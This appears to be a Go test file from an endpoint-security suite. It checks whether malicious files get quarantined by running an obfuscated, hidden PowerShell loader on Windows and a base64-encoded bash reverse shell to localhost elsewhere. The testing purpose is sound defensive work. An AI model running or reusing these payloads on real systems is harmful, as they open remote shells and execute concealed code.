/*
NAME: c521b330-70eb-4c4d-b748-a8869a7bac4c.go
RULE: Malicious files are quarantined
CREATED: 2023-01-03
*/
package main

import (
	"os"
	"os/exec"
	"runtime"
)

func test() {
	if runtime.GOOS == "windows" {
		mal := "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEARgBKAFAAdwBXAE0AQwBBADcAVgBXAGIAVwAvAGkATwBCAEQAKwB2AHQAJwAnACsAJwAnAEwAKwBCADIAcwBWAEsAWQBtAFUAOAB0AEoAeQArADEASgBwAHAAVQBzAEMATABIAFMAaABwAFUAMgBoAHAAUwB3ADYAdQBZAGsARABCAGkAZQBtAGoAdABNAFcAOQB2AGEALwAzAHoAZwB2AGgAVwByAHAAWAB1ACsAawB0AFkAUgBJADcASgBuAHgAKwBKAGwAbgBIAGkAZABNAFkAMQA5AFMASABxAE8AMQBPAEYAdQBqADcAMgAvAGYAbwBHAEkATQBzAE0AQQBSAE0AcgBSAG8AUwBDADIAawBzAGIALwBNADcAWgBLADIASQBQAGoANgBCAEgAMQBHAHgAcwBSAGUAcgBaAG8AOAB3AGoAUwBlAEgAaAArADcAcQBSAEEAawBsAHYAbAA3ADUAUQB1AFIAZABwAEsAUQA2AEoAWgBSAGsAaABnAG0AKwBoAHQAZAB6AFkAawBnAEIAMgBlADMAQwArAEoATAA5AEIAMQBwAGYAMQBXACsATQBIADYATABXAFcARwAyAGQAcgBFAC8ASgArAGoAQQBqAGcATwAxADEAdQBNACsAVgBvAGwAVgB2AEIAVwBqADAAdABDAC8AZgBkAFAAewAxAH0AeQBVAEYAOQBXAG0AbgBkAHAAWgBnAGwAaAB1ADYAdABFADAAbQBpAFMAcwBDAFkAYgBxAEkAZgBwAHQAcgB3AGMAcgAwAGkAaAB0ADYAbgB2AHUAQQBKAEQAMgBYAGwAaQBzAFoASABoADUAVgBoAG4ATwBDAFEAbgBFAEsAMABlADkASQBuAGMAcwA2AEQAUgBJAGYAVABiAE0AOABqAGkARQB4AEYAWABCAHgATAB4AGMAbQB0AEQAQgAwAGUAQgA0AEwANwBkAGgAQQBJAGsAaQBTADYAaABTAFoAcQBoADgAbAAwACsAcQBjAHgASwBiAGEALwBTAEcAewAxAH0ASgBJADEATABwAHgAcABJAEkAdgB2AEsASQB1AEsAYwArAFMAUwBvAGQASABBAGUATQBYAEoAQgB3AEMAbAA2AGUARgBEAFMAZQBUAFUAMABUAHoATwA3ADUAawBoAGgAYQBuAEQASgBtAG8AZgA4AFMAeABqAGcAbABEAHkAVgA0AHIAMwBVAHkAZABwADMAQQBhAGkAQwBGAGEAVQBGAHsAMQB9ADkAeAAyADAAegA0AE8AVQBrACcAJwArACcAJwBkAHgAVgAzADUATwBwAEkAbwBJAEoASQB5AGMARAA0AFAAZABEAFEAUgBpAFcAOQBBAGwAWABjAGUAZAB3AEQAMwArADIARQArAFcAWQBaAEMAcwBFAFUAagBZAEcAUABLAEcAWgA5ADIAZABVAHMAMQBBAGYAOQBzAGEAUwAnACcAKwAnACcAaQB6AFcAOABhAHAAYwBpAEoAZQBiADAAQwBYAEMAawAwAFkAMwBUAHUAcgBCAGUARwA2ADUAZQArAG8ATABuAHgAbwBXAEoAeQBZAGoAVABZAEwAcAAxAGYAMABZAEEATABWAG0AKwBWAHoAWQB2AHMANwBsAEoAUQBoAHEAVAA1AGoAcgBHAEUAZgBWAEwAdwBoACcAJwArACcAJwByADcAYQBrAEoAQwBSAGoASgBJAEsAcQBYAFoASwBhAFIAbgA2ACcAJwArACcAJwBNAFUAQwBDAFoAcQBFAGsAUgBtAFcAQwBtAFIARgBqAFoALwBjAFcAaABHAFYAVAA3ADUATwBTAGwAbABBAGgAJwAnACsAJwAnAE8AMQBEAFgAUgBQAEkAQwBrAHAAdQBQAGsAOABtAHIANQB1AGgAZAAnACcAKwAnACcAKwBNACsAaQBRAEMAOAAvAEIAMgA0AHEAbwBYAFEASgBxAFMAMABMAGwAcABqAFgAZQA2AHUAMwBzAEYASQBkAHgAbABPAEUAZwBzAHsAMQB9AFUAdQBoAFQAMwAwAEkAZQB3AFkAdwBFAEYAcgBMAGoAaABCAFoATABkAGkAcAA1ADkAcQBoAHYAMAArADIAbgBUAEYASQBmAEoANwBJAE0AewAxAH0AegBXAGYAbwAxAG4AcwA2AHYASQA0AGsAUwBMADEAbwBhAHEAQQB3AEsAVwAzAEkAagA3AEYAVABBAEYAaQBvAFEANAB7ADEAfQBpAEwAUAAyADYASwB6AGMAWABkADgATABoADQAcwBaAGcAKwBhAEIAUwBQAGQAUQBEAHAAaABSAE0ASABoAFMAYwBVAFYAQQBvAGoAawB2AHoASQBwAEgAWgBEAGQAYQBNAFIASwBCAFUAYQBZAGIAYgBZAFoAbgBvAEIASgBGAGoAMgBUAHMAdwBqAE0AUwA2AFAAcwBUAEwAUgBzAGgAWgA3ADAAQwBwAGsAUgBrAEoAMAAyAG8AdABzAGUANAB0AHsAMQB9AEMASQBDAGcAawBpAHAARQBEAGUAdQBQADgAdgBoADUALwBWAFIAeQBYAGoAQwBsAEwAVQB4AGkAZwA3AGIATwBLAHMAcABlAG8AQQBUAFEANAAyAEMAMABYAFMAQQBxAEkATQBFAEMARQBCAGoATABiAGcAawBZAE0AVAA4AHIANgBSADYANAB6AHgAcgBuAHAARwBYAFIAdgBHAHUAQgB1AHoAdgB1ADgAcwBhAGQAMQArAG8AUABWAHUASAAzADUAJwAnACsAJwAnAEQAZQB0AFQAbAB6AFEALwBCADEANQB7ADEAfQBGAHAAeQBxAGEAagAvAFAAUQA3AGkAYgBkAGYAbQBmAFEAUABPADkAMABHAHYAYwBuADMAcQBnAGgAdgBWACcAJwArACcAJwBaAFgAZgBoADEAMABaAGIAOQAxAHYAVgBoADQAZAB1AGQAaQBPAEoAWQAzAFgAYgB0AHoAUwBXAHYATABjAFcATwB6AE8AcQBFAGIAcgAyAGMASAA0ADgAZgBxACsANAAyAHoAZQBhAGcAJwAnACsAJwAnADUAagA1AHYARgBMAEEAagBIAHoAVABDAGMAZgBRAGkAOQBpAC8AbwBmAGIAZABxADcAYwBzACsAZAAyAGkASAB1AHsAMQB9AFYAdABwADcAOABwADUAYwBHAHEAewAxAH0AcABFAFUAZgBPAHUAZAAwAGUATAA0ACcAJwArACcAJwA4AGEAYwAnACcAKwAnACcAdgBiADgAWQBqAGgAWQBWAGkAZABYAGQAYwAvAFkAZgByAFkARQA0AHQAUgAvAGMANABlAEgANwBhAFQAJwAnACsAJwAnAEcAUwBUAGUAZABuAGgALwBMAE8ALwBuADEAZQBvAG8AcgBiAHAAMQB6AG0ANwA0AGEAbgBYADEASwBRADYAcgBvADQAJwAnACsAJwAnAEYAOQA4ADkARwBGAEUAegBRADYAdwAzAFoAYQA4AHkALwA5ADYAewAxAH0ATwBkADMAUgA1AFUANgA5AGMAQgB2AHoAMQBzAFMAMwB4AHUAZgAzADQASAA0AEUAMgBHAHsAMQB9AEoAWgBIAGgAMQB7ADEAfQB0ADcAaQBoADUAZQBmAHQARwBXADMAdwBjAFAAdgBSADIARQBIAHgASgBQAHYAdABZAEoASABQAE0AQQBGAG0AUQB4AFoATABnAGIAUwA3AGEAaABkAFkAewAxAH0ATwBGAFUAZQBoAHAARgBkAG0AVQBzAGkAWQBzAEwAZwBtAG8ARwBMAHEAQwBTAEcAegBSAGoAMwBsAGQATABtAHEAZwBnAHkAbgA0AHUAdgB1AGcAdQBHADMAUwB5AHQAZgBVADgAbQBlAGoASQAwAHQAdwBwAGMAVABoADAAZgAzADAAQwBhAHcARABaAEYAaABFAHEAUAB4AEQATQA1AHQAMgBxAFAAUgA3AFUAYQBhAEcAZgB0AHMAZABiAEkAVwBQAFgANgB3ADcAbAA4AHQAVABhAHkAWQBKAFoAUwAzAHgAeQBlAE0AagB6AEwAdwBrAHsAMQB9AEUARwBpAEwARAArAFAAMgBJACcAJwArACcAJwB3AFQAVQByAG8AZQBGAC8AZwBkAGwATAA4AE0ASABtAFMAMgBoAFEAVQBJAHkAOABiAFIAUwBJACcAJwArACcAJwBEAHUAZABzAEYAOABMAHkAYgBFACsAYwAyAEkAVQBRAHMASwB2AEQAKwBTAGYAcQBrAGcAVwB5AFEASQBBAEQAYwBnAGMAdwBxAEEAdABvADkAMABMAFQAbwBpADgAbgBDACsALwAzADgAcQBmAG8ALwB6AG4AOABCAGYALwBLAG4AKwAzAGMATAAxAFoAZgB4AGEAbQBhAFYAUwBEADAAMAAvAHoAegBpAFIAMwB0AC8ASQAwAGcAWABHAEUAcQB3AGQASQBEAEsAVwBNAGsAdgAxADEAZgB3AEsASgBvACcAJwArACcAJwBtADUAMQBDAFoAegBXAEMAcgBnAGkATABvAGIANAA3AHoAMQBKADUAYwBBAHAAZgBNAFoAbQBnAC8AZwBNADIAbQBMAEIAcwA4AEEAbwBBAEEAQQB7ADAAfQB7ADAAfQAnACcAKQAtAGYAJwAnAD0AJwAnACwAJwAnAE4AJwAnACkAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
		if _, err := exec.Command("cmd.exe", mal).Output(); err != nil {
			os.Exit(101)
		} else {
			os.Exit(100)
		}
	} else {
		mal := "echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMSAwPiYxJw== | base64 -d | bash 2>/dev/null"
		if _, err := exec.Command("/bin/bash", "-c", mal).Output(); err != nil {
			os.Exit(101)
		} else {
			os.Exit(100)
		}
	}
}

func clean() {
	os.Exit(100)
}

func main() {
	test()
}
